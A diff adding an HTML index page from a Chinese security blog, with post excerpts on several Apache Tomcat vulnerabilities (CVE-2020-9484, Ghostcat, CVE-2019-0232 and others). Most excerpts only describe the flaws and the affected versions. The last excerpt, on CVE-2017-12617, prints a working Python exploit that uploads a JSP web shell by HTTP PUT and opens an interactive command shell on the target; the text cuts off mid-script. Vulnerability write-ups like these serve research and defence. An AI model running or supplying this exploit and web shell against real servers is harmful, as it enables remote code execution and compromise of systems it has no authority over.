@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/32/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Tomcat URL解析差异性导致的安全问题/URL差异性/Tomcat HttpServletRequest中几个解析URL的函数" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/URL%E5%B7%AE%E5%BC%82%E6%80%A7/Tomcat%20HttpServletRequest%E4%B8%AD%E5%87%A0%E4%B8%AA%E8%A7%A3%E6%9E%90URL%E7%9A%84%E5%87%BD%E6%95%B0/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.918Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Tomcat-HttpServletRequest中几个解析URL的函数"><a href="#Tomcat-HttpServletRequest中几个解析URL的函数" class="headerlink" title="Tomcat HttpServletRequest中几个解析URL的函数"></a>Tomcat HttpServletRequest中几个解析URL的函数</h3><p>在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数：</p>
+<ul>
+<li>  request.getRequestURL()：返回全路径；</li>
+<li>  request.getRequestURI()：返回除去Host（域名或IP）部分的路径；</li>
+<li>  request.getContextPath()：返回工程名部分，如果工程映射为<code>/</code>，则返回为空；</li>
+<li>  request.getServletPath()：返回除去Host和工程名部分的路径；</li>
+<li>  request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</li>
+</ul>
+<p>网上的一个小结，Servlet的匹配路径为<code>/test%3F/*</code>，并且Web应用是部署在<code>/app</code>下，此时请求的URL为<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>，各个函数解析如下表：</p>
+<p>  函数               URL解码   解析结构</p>
+<hr>
+<p>  getRequestURL()    no        <code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code><br>  getRequestURI()    no        <code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code><br>  getContextPath()   no        <code>/app</code><br>  getServletPath()   yes       <code>/test?</code><br>  getPathInfo()      yes       <code>/a?+b</code></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/URL%E5%B7%AE%E5%BC%82%E6%80%A7/Tomcat%20HttpServletRequest%E4%B8%AD%E5%87%A0%E4%B8%AA%E8%A7%A3%E6%9E%90URL%E7%9A%84%E5%87%BD%E6%95%B0/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/URL%E5%B7%AE%E5%BC%82%E6%80%A7/Tomcat%20HttpServletRequest%E4%B8%AD%E5%87%A0%E4%B8%AA%E8%A7%A3%E6%9E%90URL%E7%9A%84%E5%87%BD%E6%95%B0/" data-id="cl5c2qxin00k4y8v1alqhf9zi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Tomcat URL解析差异性导致的安全问题/简介" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/%E7%AE%80%E4%BB%8B/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.912Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。</p>
+<p>当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/%E7%AE%80%E4%BB%8B/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/%E7%AE%80%E4%BB%8B/" data-id="cl5c2qx6x00jjy8v17c6487mf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Tomcat/（CVE-2020-9484）Tomcat session反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2020-9484%EF%BC%89Tomcat%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.530Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-9484）Tomcat-session反序列化漏洞"><a href="#（CVE-2020-9484）Tomcat-session反序列化漏洞" class="headerlink" title="（CVE-2020-9484）Tomcat session反序列化漏洞"></a>（CVE-2020-9484）Tomcat session反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>对<br>于一个企业级应用而言，Session对象的管理十分重要。Sessio对象的信息一般情况下置于服务器的内存中，当服务器由于故障重启，或应用重新加载<br>时候，此时的Session信息将全部丢失。为了避免这样的情况，在某些场合可以将服务器的Session数据存放在文件系统或数据库中，这样的操作称为<br>Session对象的持久化。Session对象在持久化时，存放在其中的对象以序列化的形式存放，这就是为什么一般存放在Session中的数据需要实<br>现可序列化接口（java.io.Serializable）的原因了。当一个Session开始时，Servlet容器会为Session创建一个HttpSession对象。Servlet容器在某些情况下把这些<br>HttpSession对象从内存中转移到文件系统或数据库中，在需要访问<br>HttpSession信息时再把它们加载到内存中。</p>
+<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>要完成session持久化，存放在session里的对象必须要实现<code>java.io.Serializable</code><br>接口。Session的持久化是由<code>Session Manager</code>来管理的。Tomcat提供了两个实现类：</p>
+<ul>
+<li>  <strong>org.apache.catalina.session.StandardManager</strong> (默认)</li>
+<li>  <strong>org.apache.catalina.session.PersistentManager</strong></li>
+</ul>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>存储在本地文件中需要配置conf目录里的<strong>context.xml</strong>文件在<code>节点下添加如下</code>节点：</p>
+<pre><code>&lt;Manager className=&quot;org.apache.catalina.session.PersistentManager&quot; 
+    debug=&quot;0&quot;
+    saveOnRestart=&quot;false&quot;
+    maxActiveSession=&quot;-1&quot;
+    minIdleSwap=&quot;-1&quot;
+    maxIdleSwap=&quot;-1&quot;
+    maxIdleBackup=&quot;-1&quot;&gt;
+    &lt;Store className=&quot;org.apache.catalina.session.FileStore&quot; directory=&quot;../session&quot; /&gt;
+&lt;/Manager&gt;
+</code></pre>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2020-9484%EF%BC%89Tomcat%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2020-9484%EF%BC%89Tomcat%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwyg00jey8v120zffl7y" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Tomcat/（CVE-2020-1938）Apache Tomcat 文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.528Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-1938）Apache-Tomcat-文件包含漏洞"><a href="#（CVE-2020-1938）Apache-Tomcat-文件包含漏洞" class="headerlink" title="（CVE-2020-1938）Apache Tomcat 文件包含漏洞"></a>（CVE-2020-1938）Apache Tomcat 文件包含漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector<br>且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat<br>漏洞利用的风险。</p>
+<p>注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
+<li><p>  Apache Tomcat 6</p>
+</li>
+<li><p>  Apache Tomcat 7 &lt; 7.0.100</p>
+</li>
+<li><p>  Apache Tomcat 8 &lt; 8.5.51</p>
+</li>
+<li><p>  Apache Tomcat 9 &lt; 9.0.31</p>
+</li>
+</ul>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>由于 <strong>AJP</strong> 并不是一个 <strong>HTTP</strong> 业务流，走的是 <strong>Socket</strong> ，所以<br><strong>tomcat</strong> 前面接收业务流的时候调用的是一个 <strong>Socket</strong> 解析类<br><strong>SocketProcessorBase#dorun</strong> 来处理 <strong>ajp</strong> 传入的二进制流。</p>
+<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwzn00jiy8v12ux9br6j" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Tomcat/（CVE-2019-0232）Tomcat rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2019-0232%EF%BC%89Tomcat%20rce/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.525Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-0232）Tomcat-rce"><a href="#（CVE-2019-0232）Tomcat-rce" class="headerlink" title="（CVE-2019-0232）Tomcat rce"></a>（CVE-2019-0232）Tomcat rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞是由于Tomcat<br>CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。</p>
+<p>该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Tomcat 9.0.0.M1 to 9.0.17</p>
+<p>Apache Tomcat 8.5.0 to 8.5.39</p>
+<p>Apache Tomcat 7.0.0 to 7.0.93</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2019-0232%EF%BC%89Tomcat%20rce/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2019-0232%EF%BC%89Tomcat%20rce/" data-id="cl5c2qwyf00jcy8v189d0cloo" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Tomcat/（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2019-0221%EF%BC%89Apache%20Tomcat%20SSI%20printenv%E6%8C%87%E4%BB%A4%E4%B8%AD%E7%9A%84XSS/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.523Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-0221）Apache-Tomcat-SSI-printenv指令中的XSS"><a href="#（CVE-2019-0221）Apache-Tomcat-SSI-printenv指令中的XSS" class="headerlink" title="（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS"></a>（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>Tomcat在其SSI实现中存在漏洞，可用于实现跨站点脚本（XSS）。只有在启用SSI并使用”printenv”指令的情况下，才能利用此漏洞。</p>
+<p>利用条件</p>
+<ul>
+<li>必须在Apache Tomcat中启用SSI支持 -<br>  全局或特定Web应用程序。默认情况下不启用。</li>
+<li>  Web应用程序中必须存在具有”printenv”SSI指令的文件(通常为”.shtml”)。</li>
+<li>  攻击者必须能够访问该文件。</li>
+</ul>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Tomcat 9.0.0.M1版本至9.0.0.17版本、</p>
+<p>Apache Tomcat 8.5.0版本至8.5.39版本</p>
+<p>Apache Tomcat 7.0.0版本至7.0.93版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2019-0221%EF%BC%89Apache%20Tomcat%20SSI%20printenv%E6%8C%87%E4%BB%A4%E4%B8%AD%E7%9A%84XSS/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2019-0221%EF%BC%89Apache%20Tomcat%20SSI%20printenv%E6%8C%87%E4%BB%A4%E4%B8%AD%E7%9A%84XSS/" data-id="cl5c2qwyf00jdy8v15ol20utl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Tomcat/（CVE-2018-1305）Tomcat 安全绕过漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2018-1305%EF%BC%89Tomcat%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.521Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-1305）Tomcat-安全绕过漏洞"><a href="#（CVE-2018-1305）Tomcat-安全绕过漏洞" class="headerlink" title="（CVE-2018-1305）Tomcat 安全绕过漏洞"></a>（CVE-2018-1305）Tomcat 安全绕过漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>近日，Apache发布安全公告称Apache Tomcat<br>7、8、9多个版本存在安全绕过漏洞。攻击者可以利用这个问题，绕过某些安全限制来执行未经授权的操作，这可能有助于进一步攻击。</p>
+<p>Apache Tomcat servlet<br>注释定义的安全约束，只在servlet加载后才应用一次。由于以这种方式定义的安全约束，应用于URL模式及该点下任何URL，很可能取决于servlet加载的次序，这可能会将资源暴露给未经授权访问它们的用户。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Tomcat &lt; 9.0.5</p>
+<p>Apache Tomcat &lt; 8.5.28</p>
+<p>Apache Tomcat &lt; 8.0.50</p>
+<p>Apache Tomcat &lt; 7.0.85</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2018-1305%EF%BC%89Tomcat%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2018-1305%EF%BC%89Tomcat%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwyf00jby8v1cqpn0aq5" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Tomcat/（CVE-2017-12617）Tomcat RCE via JSP Upload Bypass" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2017-12617%EF%BC%89Tomcat%20RCE%20via%20JSP%20Upload%20Bypass/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.518Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-12617）Tomcat-RCE-via-JSP-Upload-Bypass"><a href="#（CVE-2017-12617）Tomcat-RCE-via-JSP-Upload-Bypass" class="headerlink" title="（CVE-2017-12617）Tomcat RCE via JSP Upload Bypass"></a>（CVE-2017-12617）Tomcat RCE via JSP Upload Bypass</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>Tomcat版本9.0.0.M1至9.0.0、8.5.0至8.5.22、8.0.0.RC1至8.0.46和7.0.0至7.0.81且启用HTTP<br>PUT时（例如，通过设置只读如果将Default<br>servlet的初始化参数设置为false，则可以通过特制请求将JSP文件上载到服务器。然后可以请求此JSP，并且服务器将执行其中包含的所有代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Tomcat版本9.0.0.M1至9.0.0Apache Tomcat版本8.5.0至8.5.22Apache Tomcat版本8.0.0.RC1至8.0.46Apache Tomcat版本7.0.0至7.0.81</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><strong>msf自带的有利用脚本，懒省事可以直接用msf</strong><img src="/resource/(CVE-2017-12617)TomcatRCEviaJSPUploadBypass/media/rId24.png" alt="QQ截图20200521185636.png"></p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><strong>useage</strong></p>
+<pre><code>./cve-2017-12617.py -u http://www.0-sec.org
+./cve-2017-12617.py --url http://www.0-sec.org
+./cve-2017-12617.py -u http://www.0-sec.org -p pwn
+./cve-2017-12617.py --url http://www.0-sec.org -pwn pwn
+./cve-2017-12617.py -l hotsts.txt
+./cve-2017-12617.py --list hosts.txt
+#!/usr/bin/python
+import requests
+import re
+import signal
+from optparse import OptionParser
+
+
+
+
+
+
+class bcolors:
+    HEADER = &#39;\033[95m&#39;
+    OKBLUE = &#39;\033[94m&#39;
+    OKGREEN = &#39;\033[92m&#39;
+    WARNING = &#39;\033[93m&#39;
+    FAIL = &#39;\033[91m&#39;
+    ENDC = &#39;\033[0m&#39;
+    BOLD = &#39;\033[1m&#39;
+    UNDERLINE = &#39;\033[4m&#39;
+
+
+
+
+banner=&quot;&quot;&quot;
+   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
+  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
+ | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
+ | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \| |  / /  
+ | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
+  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
+                                                                           
+                                                                           
+[@intx0x80]
+&quot;&quot;&quot;
+
+
+
+
+
+def signal_handler(signal, frame):
+
+    print (&quot;\033[91m&quot;+&quot;\n[-] Exiting&quot;+&quot;\033[0m&quot;)
+
+    exit()
+
+signal.signal(signal.SIGINT, signal_handler)
+
+
+
+
+def removetags(tags):
+  remove = re.compile(&#39;&lt;.*?&gt;&#39;)
+  txt = re.sub(remove, &#39;\n&#39;, tags)
+  return txt.replace(&quot;\n\n\n&quot;,&quot;\n&quot;)
+
+
+def getContent(url,f):
+    headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;&#125;
+    requests.packages.urllib3.disable_warnings()
+    re=requests.get(str(url)+&quot;/&quot;+str(f), headers=headers,verify=False)
+    return re.content
+
+def createPayload(url,f):
+    evil=&#39;&lt;% out.println(&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;);%&gt;&#39;
+    headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;&#125;
+    requests.packages.urllib3.disable_warnings()
+    req=requests.put(str(url)+str(f)+&quot;/&quot;,data=evil, headers=headers,verify=False)
+    if req.status_code==201:
+        print &quot;File Created ..&quot;
+
+   
+def RCE(url,f):
+    EVIL=&quot;&quot;&quot;&lt;FORM METHOD=GET ACTION=&#39;&#123;&#125;&#39;&gt;&quot;&quot;&quot;.format(f)+&quot;&quot;&quot;
+    &lt;INPUT name=&#39;cmd&#39; type=text&gt;
+    &lt;INPUT type=submit value=&#39;Run&#39;&gt;
+    &lt;/FORM&gt;
+    &lt;%@ page import=&quot;java.io.*&quot; %&gt;
+    &lt;%
+   String cmd = request.getParameter(&quot;cmd&quot;);
+   String output = &quot;&quot;;
+   if(cmd != null) &#123;
+      String s = null;
+      try &#123;
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new
+InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) &#123; output += s+&quot;&lt;/br&gt;&quot;; &#125;
+      &#125;  catch(IOException e) &#123;   e.printStackTrace();   &#125;
+   &#125;
+%&gt;
+&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;&quot;&quot;&quot;
+
+
+    
+    headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;&#125;
+    requests.packages.urllib3.disable_warnings()
+    req=requests.put(str(url)+f+&quot;/&quot;,data=EVIL, headers=headers,verify=False)
+    
+
+
+def shell(url,f):
+    
+    while True:
+        headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;&#125;
+        cmd=raw_input(&quot;$ &quot;)
+        payload=&#123;&#39;cmd&#39;:cmd&#125;
+        if cmd==&quot;q&quot; or cmd==&quot;Q&quot;:
+                break
+        requests.packages.urllib3.disable_warnings()
+        re=requests.get(str(url)+&quot;/&quot;+str(f),params=payload,headers=headers,verify=False)
+        re=str(re.content)
+        t=removetags(re)
+        print t
+
+
+
+
+
+#print bcolors.HEADER+ banner+bcolors.ENDC
+
+parse=OptionParser(
+
+
+bcolors.HEADER+&quot;&quot;&quot;
+   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
+  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
+ | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
+ | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \| |  / /  
